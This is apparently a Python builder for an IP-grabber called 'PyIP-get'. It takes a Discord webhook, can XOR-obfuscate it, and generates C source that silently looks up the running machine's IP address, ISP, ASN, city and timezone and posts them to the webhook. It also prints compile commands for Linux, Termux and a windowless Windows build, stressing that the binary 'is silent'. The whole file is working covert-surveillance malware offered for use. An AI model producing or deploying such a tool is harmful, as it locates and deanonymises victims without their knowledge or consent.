#!/usr/bin/env python3
import os, sys, random

def build_c(webhook, obfuscate):
    if obfuscate:
        key = random.randint(1, 255)
        enc = bytes([b ^ key for b in webhook.encode()])
        arr = ",".join(str(x) for x in enc)
        wh_code = (
            "unsigned char _w[]={" + arr + "};\n"
            "char wh[" + str(len(webhook) + 1) + "];\n"
            "for(int i=0;i<" + str(len(webhook)) + ";i++)wh[i]=_w[i]^" + str(key) + ";\n"
            "wh[" + str(len(webhook)) + "]=0;\n"
        )
    else:
        wh_code = 'char wh[]="' + webhook + '";\n'

    c = r'''#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#ifdef _WIN32
#include <windows.h>
#define popen _popen
#define pclose _pclose
#define strdup _strdup
#else
#include <unistd.h>
#endif

static char *rc(const char *c) {
    FILE *f = popen(c, "r");
    if (!f) return NULL;
    char b[16384] = {0};
    size_t n = fread(b, 1, sizeof(b) - 1, f);
    pclose(f);
    while (n && (b[n - 1] == '\n' || b[n - 1] == '\r' || b[n - 1] == ' ')) b[--n] = 0;
    return n ? strdup(b) : NULL;
}

static char *jg(const char *j, const char *k) {
    char s[128];
    snprintf(s, sizeof(s), "\"%s\":\"", k);
    char *p = strstr(j, s);
    if (!p) return strdup("");
    p += strlen(s);
    char *e = strchr(p, '"');
    if (!e) return strdup("");
    size_t l = e - p;
    char *r = malloc(l + 1);
    memcpy(r, p, l);
    r[l] = 0;
    return r;
}

int main(void) {
''' + wh_code + r'''    char *raw = rc("curl -fsS --max-time 8 http://ip-api.com/json/?fields=status,query,isp,org,as,city,regionName,timezone 2>/dev/null");
    if (!raw) return 1;
    char *ip = jg(raw, "query");
    char *isp = jg(raw, "isp");
    char *org = jg(raw, "org");
    char *asn = jg(raw, "as");
    char *city = jg(raw, "city");
    char *reg = jg(raw, "regionName");
    char *tz = jg(raw, "timezone");
    free(raw);
    time_t t = time(NULL);
    struct tm *tm_info = gmtime(&t);
    char ts[64];
    strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S UTC", tm_info);
    char pl[4096];
    snprintf(pl, sizeof(pl),
        "{\"username\":\"PyIP-get\",\"embeds\":[{\"title\":\"IP Report\",\"color\":5793266,\"fields\":["
        "{\"name\":\"IP\",\"value\":\"`%s`\",\"inline\":true},"
        "{\"name\":\"ISP\",\"value\":\"`%s`\",\"inline\":true},"
        "{\"name\":\"Org\",\"value\":\"`%s`\",\"inline\":true},"
        "{\"name\":\"ASN\",\"value\":\"`%s`\",\"inline\":true},"
        "{\"name\":\"City\",\"value\":\"`%s`\",\"inline\":true},"
        "{\"name\":\"Region\",\"value\":\"`%s`\",\"inline\":true},"
        "{\"name\":\"Timezone\",\"value\":\"`%s`\",\"inline\":true}"
        "],\"footer\":{\"text\":\"%s\"}}]}",
        ip, isp, org, asn, city, reg, tz, ts);
#ifdef _WIN32
    char tf[MAX_PATH];
    GetTempPathA(MAX_PATH, tf);
    strcat(tf, "pXXXXXX.tmp");
    FILE *f = fopen(tf, "wb");
    if (!f) goto end;
    fwrite(pl, 1, strlen(pl), f);
    fclose(f);
    char cmd[2048];
    snprintf(cmd, sizeof(cmd), "curl -fsS -X POST -H \"Content-Type: application/json\" --data-binary @\"%s\" \"%s\" >nul 2>&1", tf, wh);
    system(cmd);
    remove(tf);
#else
    char tf[] = "/tmp/.pXXXXXX";
    int fd = mkstemp(tf);
    if (fd < 0) goto end;
    write(fd, pl, strlen(pl));
    close(fd);
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "curl -fsS -X POST -H 'Content-Type: application/json' --data-binary @%s '%s' >/dev/null 2>&1", tf, wh);
    system(cmd);
    unlink(tf);
#endif
end:
    free(ip); free(isp); free(org); free(asn); free(city); free(reg); free(tz);
    return 0;
}
'''
    return c

def main():
    print("PyIP-get")
    wh = input("Discord Webhook: ").strip()
    if not wh:
        sys.exit(1)
    ob = input("Deep obfuscation? [y/N]: ").strip().lower() == "y"
    os.makedirs("PyIP-get", exist_ok=True)
    src = build_c(wh, ob)
    with open("PyIP-get/main.c", "w") as f:
        f.write(src)
    print("Wrote: PyIP-get/main.c")
    if ob:
        print("Obfuscation: ON")
    print()
    print("Build commands:")
    print()
    print("  [x86_64 Linux]")
    print("  gcc -O2 -s -o PyIP-get/ipget_x86_64 PyIP-get/main.c")
    print()
    print("  [aarch64 / Termux]")
    print("  aarch64-linux-gnu-gcc -O2 -s -o PyIP-get/ipget_aarch64 PyIP-get/main.c")
    print("  # or on Termux itself:")
    print("  pkg install clang curl")
    print("  clang -O2 -s -o ipget PyIP-get/main.c")
    print()
    print("  [Windows Cross-Compile from Linux]")
    print("  x86_64-w64-mingw32-gcc -O2 -s -mwindows -o PyIP-get/ipget_x64.exe PyIP-get/main.c")
    print()
    print("  [Windows Native - MinGW/Clang]")
    print("  gcc -O2 -s -mwindows -o ipget.exe PyIP-get/main.c")
    print()
    print("  [Windows Native - MSVC]")
    print("  cl /O2 /Fe:ipget.exe PyIP-get/main.c")
    print()
    print("Run the resulting binary. It is silent.")

if __name__ == "__main__":
    main()
